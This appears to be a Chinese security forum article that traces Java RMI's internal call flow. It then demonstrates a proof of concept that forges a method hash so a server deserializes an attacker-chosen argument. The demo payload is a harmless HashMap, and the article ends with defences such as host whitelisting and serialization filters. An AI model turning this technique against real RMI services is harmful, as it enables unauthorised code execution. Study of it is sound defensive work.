RMI概览
=====

**本地的ava程序 调用 远程Java程序 的类和方法**，在调用过程中类对象会进行传递，远程Java服务执行完毕后将结果返回。整个过程给程序员的感觉就像在本地调用一样。这就是RMI (Remote Method Invocation)。

更多详细的可参考[这篇文章](https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html)。本节仅粗浅介绍RMI。

**Demo:**  
Server端代码包含三个部分：

1. Registry类，用于开放RMI查询端口。其功能是为所有注册的服务类提供路由
2. 远程对象类(Remote Object)，用于提供RMI远程对象，被客户端所使用的类
3. 远程对象的接口，所有服务类都需要实现各自的远程对象类接口。

*远程对象接口 MyService*

```java
public interface MyService extends Remote { //接口需要继承Remote
    public String printHello(String hello) throws RemoteException;
}
```

*远程对象类 MyServiceImpl*

```java
//继承UnicastRemoteObject并且实现其接口MyService
public class MyServiceImpl extends UnicastRemoteObject implements MyService {
    //远程对象类的所有方法都需要抛出RemoteException
    public MyServiceImpl() throws RemoteException {
    }

    @Override
    public String printHello(String hello) throws RemoteException {
        System.out.println("[Server] " + hello);
        return hello;
    }
}
```

*Registry类 RmiServer*

```java
public class RmiServer {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(1099);
        MyService myService = new MyServiceImpl();
        registry.bind("myService", myService);
    }
}
```

Client端代码包含两个部分：

1. 远程对象类的接口，需要从Server端复制一份。以便和Server端统一，以此保证本地调用时不会报"找不到类"的错误。
2. 调用类，根据本地的远程对象类接口调用Server端的远程对象类。

*远程对象类接口 MyService*

```java
//该接口需要从Server端取得
//正常的RMI程序都会在Server端和Client放置远程对象类接口的
public interface MyService extends Remote {
    public String printHello(String hello) throws RemoteException;
}
```

*调用类 App*

```java
public class App
{
    public static void main( String[] args ) throws Exception
    {
        MyService lookup = (MyService) Naming.lookup("rmi://127.0.0.1:1099/myService");
        String helloWorld = lookup.printHello("helloWorld");
        System.out.printf("[Client] " + helloWorld);
    }
}
```

运行时先运行Server端的*RmiServer*，然后再运行Client端的*App*，将会得到如下结果:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fc9f432f8b677e92bc011b2384bb9e187d555898.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fc9f432f8b677e92bc011b2384bb9e187d555898.png)

下面简单梳理下RMI之间通信的流程。

RMI流程梳理
=======

[官方文档](https://docs.oracle.com/javase/tutorial/rmi/overview.html)有对RMI流程进行简单的说明，并且给出了流程的三个主要步骤：

1. "路由远程对象(Locate remote objects)"
2. "远程对象通信(Communicate with remote objects)"
3. "类加载及传输(Load class definitions for objects that are passed around)"

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e19d21c588e950bfd3d7ccad627945a39abb1989.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e19d21c588e950bfd3d7ccad627945a39abb1989.png)

下面跟进RMI代码看看整个流程是什么样的，代码依然用前文的作Demo。  
**调试的JDK版本: 11.0.3**

路由远程对象
------

\*\*Server端\*\**RmiServer*代码中，`LocateRegistry.createRegistry(1099)`会开启一个监听端口为1099的*rmiregistry*作为*remote object*的路由。

而`registry.bind("myService", myService);`会创建一个监听端口随机的*remote object*，并将这个*remtoe object*注册到*rmiregistry*中。

```java
public class RmiServer {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(1099);
        MyService myService = new MyServiceImpl();
        registry.bind("myService", myService);
    }
}
```

在**Client端**调用了`Naming.lookup()`后，将会在`sun.rmi.registry.RegistryImpl_Stub.lookup()`发起一次对*rmiregistry*的RMI请求，目的是查询指定*remote object*的地址。

```java
public Remote lookup(String $param_String_1){
    //构建请求参数
    RemoteCall call = ref.newCall((RemoteObject) this, operations, 2, interfaceHash);
    ObjectOutput out = call.getOutputStream();
    out.writeObject($param_String_1);
    //发起RMI请求
    ref.invoke(call);
    .....
}
```

而**Server端**会在 `sun.rmi.server.UnicastServerRef.dispatch()`接收RMI请求，并发配给`sun.rmi.registry.RegistryImpl_Skel.dispatch()`处理

*UnicastServerRef*

```java
public void dispatch(Remote obj, RemoteCall call) {
    in = call.getInputStream();
    num = in.readInt();
    if (skel != null) {
        // If there is a skeleton, use it
        oldDispatch(obj, call, num);
        return;
    }
    ......
}

private void oldDispatch(Remote obj, RemoteCall call, int op){
    in = call.getInputStream();
    .....
    skel.dispatch(obj, call, op, hash);
}
```

`RegistryImpl_Skel`会根据*remote object*的名字，查询对应的*remote object*。

*RegistryImpl\_Skel*

```java
public void dispatch(Remote obj, RemoteCall call, int opnum, long hash){
    switch (opnum) {
        .....    
        case 2: // lookup(String)
        {
            //获取remote object名字
            ObjectInput in = call.getInputStream();
            $param_String_1 = (String) in.readObject();
            //查询是否有注册该remote object
            Remote $result = server.lookup($param_String_1);
            //若存在，写入RemoteCall中由上级调用返回
            ObjectOutput out = call.getResultStream(true);
            //封装remote object信息
            out.writeObject($result);
            break;
        }
        .....    
    }
}
```

查询到*remote object*后，会调用`out.writeObject($result);`封装 *remote object*，该方法会在`java.io.ObjectOutputStream.writeObject0()`将*remote object*通过`Stub`进行对象代理。最后写入到序列化流的是被对象代理过的*remote object*

```java
private void writeObject0(Object obj, boolean unshared){
     if (enableReplace) {
         //对象代理
         Object rep = replaceObject(obj);
         if (rep != obj && rep != null) {
             cl = rep.getClass();
             desc = ObjectStreamClass.lookup(cl, true);
         }
         obj = rep;
     }
    ......
}
```

**Client端**将在`sun.rmi.registry.RegistryImpl_Stub.lookup()`将回传信息转换成`Remote`类型。此时路由远程对象基本结束。

```java
public Remote lookup(String $param_String_1){
    .....
    //发送RMI请求
    ref.invoke(call);
    //获取Server端回传信息
    java.io.ObjectInput in = call.getInputStream();
    $result = (Remote) in.readObject();
    ref.done(call);
    return $result;
}
```

远程对象通信&amp;类加载及传输
-----------------

**Client端**在通过`lookup()`得到远程对象的信息后，实际上拿到的是一个`Proxy`代理对象。调用代理对象的任意方法都会触发其`InvocationHandler`的`invoke()`方法。所以Client端的第二行代码实际上是调用了`java.rmi.server.RemoteObjectInvocationHandler.invoke()`

```java
MyService lookup = (MyService) Naming.lookup("rmi://127.0.0.1:1099/myService");
String helloWorld = lookup.printHello("helloWorld");
```

`RemoteObjectInvocationHandler.invoke()`最终会调用`sun.rmi.server.UnicastRef.invoke()`，Client端在这里构建调用远程方法所需要的参数:

*UnicastRef*

```java
public Object invoke(Remote obj,
                     Method method,
                     Object[] params,
                     long opnum){

    Connection conn = ref.getChannel().newConnection();
    //将`-1`和`opnum`的值写入StreamRemoteCall
    call = new StreamRemoteCall(conn, ref.getObjID(), -1, opnum);
    //根据调用方法的参数个数和类型
    //将传递的形参序列化写入StreamRemoteCall
    ObjectOutput out = call.getOutputStream();
    Class<?>[] types = method.getParameterTypes();
    for (int i = 0; i < types.length; i++) {
        marshalValue(types[i], params[i], out);
    }
    //发送RMI请求
    call.executeCall();
    .....
}
```

其中`invoke()`的四个形参都各自具有意义:

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5e3c76c0acecccf7b839d2d5b05cb5b09e9ede22.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5e3c76c0acecccf7b839d2d5b05cb5b09e9ede22.png)

- `Remote obj`: 路由远程对象时Server端返回的经`Proxy`封装过的`Remote`对象
- `Method method`: 调用方法的`Method`对象。由于Client端也有远程对象的接口拷贝，所以可以通过反射获取对应方法的`Method`对象
- `Object[] params`: 传递给调用方法的形参，**该值将会在Server端被反序列化**
- `long opnum`: 调用方法的"Hash值"，该值通过`RemoteObjectInvocationHandler.getMethodHash()`计算，用于确保双方方法是一致的。

**Server端**在`sun.rmi.server.UnicastServerRef.dispatch()`对Client的请求进行处理:

*UnicastServerRef*

```java
public void dispatch(Remote obj, RemoteCall call) {
    in = call.getInputStream();
    num = in.readInt();
    //执行lookup时请求skel获得Remote Object的真实地址
    //在远程对象通信阶段，skel为空
    if (skel != null) {
        oldDispatch(obj, call, num);
        return;
    }

    //读取方法Hash值，Client调用的方法需要和Server端匹配才会允许调用
    op = in.readLong();
    MarshalInputStream marshalStream = (MarshalInputStream) in;
    //RMI在注册时就将Method存入一个HashMap中，方法Hash作键
    //Server直接用Client传来的方法Hash拿到对应的Method
    Method method = hashToMethod_Map.get(op);

    //获取调用方法的形参
    Class<?>[] types = method.getParameterTypes();
    Object[] params = new Object[types.length];

    //设置反序列化filter
    //但在远程对象通信阶段，filter为null，并不会设置反序列化filter
    unmarshalCustomCallData(in);

    //若调用方法有形参，对`in`执行反序列化，存入`params`中
    for (int i = 0; i < types.length; i++) {
        params[i] = unmarshalValue(types[i], in);
    }

    //调用对应的方法，并将返回值存在`result`中
    result = method.invoke(obj, params);
    //把`result`写入`call`的序列化流中
    ObjectOutput out = call.getResultStream(true);
    Class<?> rtype = method.getReturnType();
    if (rtype != void.class) {
        marshalValue(rtype, result, out);
    }
    //利用`call`将数据发送给Client端
    call.releaseInputStream();
    call.releaseOutputStream();
}
```

**Client端**接收返回值后也将会返回值`return`回调用端

*UnicastRef*

```java
public Object invoke(Remote obj,
                     Method method,
                     Object[] params,
                     long opnum){
    .....
    //发送RMI请求
    call.executeCall();

    //接受Server端返回数据
    Class<?> rtype = method.getReturnType();
    if (rtype == void.class)
        return null;
    ObjectInput in = call.getInputStream();
    //反序列化返回值
    Object returnValue = unmarshalValue(rtype, in);
    return returnValue;
}
```

至此一个基本的RMI调用流程就是这样，我们需要先对RMI的流程有所了解之后，才方便后续漏洞的理解。

攻击一个暴露的 RMI Registry 端口的方式，最常见的是在 *远程对象通信* 利用RMI处理远程对象时打反序列化。其次还有利用JDK低版本在 *服务查询阶段* 的缺陷打反序列化的，这部分 [这篇文章](https://www.anquanke.com/post/id/197829) 讲的挺清楚了，本文不再赘述。

RMI处理远程对象时打反序列化
===============

**调试的JDK版本: 11.0.3**

**攻击方式：**

看完前文的流程，不难发现Server端在 *远程对象通信* 时，会**反序列化**Client端发送的**方法参数**，而且没有限制。我们是否能控制发送的**方法参数**呢？根据前文分析Client端发起 *远程对象通信* 的代码可发现，主要是靠 `UnicastRef#invoke()`发起请求的。我们尝试手工调用这个方法:

*TestPoc*

```java
package org.example;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.HashMap;
import sun.rmi.server.UnicastRef;

public class TestPoc
{
    public static void main( String[] args ) throws Exception
    {
        //路由远程对象，拿到Server端返回的Remote
        MyService lookup = (MyService)Naming.lookup("rmi://127.0.0.1:1099/myService");

        //由于`UnicastRef#invoke()`需要四个形参，其类型分别为
        //Remote 可以直接用`lookup`
        //Method 反射接口，拿到调用方法的Method对象即可
        //Object[] 调用方法的参数，也就是让Server端反序列化的payload
        //long 调用方法的Hash，需要手工调用`RemoteObjectInvocationHandler#getMethodHash()`获得

        //第一步，获取UnicastRef，利用已有的UnicastRef实例调用invoke()方法
        Class<Proxy> proxyClass = Proxy.class;
        Field h = proxyClass.getDeclaredField("h");
        h.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) h.get(lookup);

        Class remoteObjectClass = RemoteObject.class;
        Field ref = remoteObjectClass.getDeclaredField("ref");
        ref.setAccessible(true);
        UnicastRef unicastRef = (UnicastRef)ref.get(invocationHandler);

        //第二步，拿到调用方法的Method对象
        Class myServiceClass = MyService.class;
        Method printHello = myServiceClass.getMethod("printHello", String.class);

        //第三步，拿到调用方法的Hash
        Class remoteObjectInvocationHandlerClass = RemoteObjectInvocationHandler.class;
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
        Method getMethodHash = remoteObjectInvocationHandlerClass.getDeclaredMethod("getMethodHash", Method.class);
        getMethodHash.setAccessible(true);
        long methodHash = (long) getMethodHash.invoke(remoteObjectInvocationHandler, printHello);

        //第四步，构造Payload，这里作为演示仅构造一个HashMap
        HashMap payload = new HashMap<>();

        //最终手工调用`UnicastRef#invoke()`
        unicastRef.invoke(lookup, printHello, new Object[]{payload}, methodHash);
    }
}
```

其中`lookup`是一个代理对象，其结构如下:

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7c4a7d6bfba1af55e0eb8fe2ff77d44c7096319d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7c4a7d6bfba1af55e0eb8fe2ff77d44c7096319d.png)

手工调用 `UnicastRef#invoke()`的好处是：不需要理会实际调用接口方法的**形参类型**，因为检测类型一致是根据方法Hash判断的，方法Hash可伪造，所以哪怕类型不符也能让Server端反序列化payload。

实际测试打Server端，形参类型是String，但确实能顺利反序列化HashMap。

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bf8d759980092a583993d9c7a17cd7755d1f95a4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bf8d759980092a583993d9c7a17cd7755d1f95a4.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6ac74a344d38a4694d1e15672e5d2ae01debbcd2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-6ac74a344d38a4694d1e15672e5d2ae01debbcd2.png)

现成利用工具
======

当然这种方式已经有人做成工具了，工具名[rmiscout](https://github.com/BishopFox/rmiscout)。readMe中也有说明用法，下面简单使用下:

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f79b8b549fb7a31b58beb43e2bbea51e9882e9a9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f79b8b549fb7a31b58beb43e2bbea51e9882e9a9.png)

利用范围和防御
=======

由于方法参数类型多种，所以默认RMI Registry的反序列化Filter是不会起作用的。换言之只要是默认的RMI配置，暴露的RMI端口并且有一个方法形参类型是对象，就一定能利用成功。

那该如何防御呢？简单来说有这几种方法：

1. **方法的形参能不传对象就不传对象**
2. **为RMI设置鉴权，仅让可信的主机连接，甚至使用SSL，具体可参考[文章](https://docs.oracle.com/javase/10/security/sample-code-illustrating-secure-rmi-connection.htm#JSSEC-GUID-2F82CCFD-22E6-4E6E-A2E1-88CF2BB19E87)**

简单来说就是设置一个`java.security.policy`，里面通过`java.net.SocketPermission`设置IP白名单

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b75a7698976c08931261fedd3dddfeb8b30ec33d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b75a7698976c08931261fedd3dddfeb8b30ec33d.png)

只有白名单内的主机才能正常访问

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-890e80c9a16dce9067f47d2a4160976786531284.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-890e80c9a16dce9067f47d2a4160976786531284.png)

其他地址请求将会被拒绝

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-773aa27cae5985d7befef74fc09e80d01919b77d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-773aa27cae5985d7befef74fc09e80d01919b77d.png)

3. **设置反序列化白/黑名单，具体可参考 [文章](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm#JSCOR-GUID-0A1D23AB-2F18-4979-9288-9CFEC04F207E)**

简单来说就是设置一个`jdk.serialFilter`

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d8bbd5cc9ccd0ee54ed01cc670c3e0966d354df0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d8bbd5cc9ccd0ee54ed01cc670c3e0966d354df0.png)

Reference
=========

[Remote Method Invocation (RMI)](https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html)  
[浅谈Java RMI Registry安全问题](https://www.anquanke.com/post/id/197829)  
[java远程代码注入\_Java RMI远程反序列化任意类及远程代码执行解析（CVE-2017-3241 ）](https://blog.csdn.net/weixin_33240229/article/details/114757143)  
[Sample Code Illustrating a Secure RMI Connection](https://docs.oracle.com/javase/10/security/sample-code-illustrating-secure-rmi-connection.htm#JSSEC-GUID-2F82CCFD-22E6-4E6E-A2E1-88CF2BB19E87)  
[Serialization Filtering](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm#JSCOR-GUID-3ECB288D-E5BD-4412-892F-E9BB11D4C98A)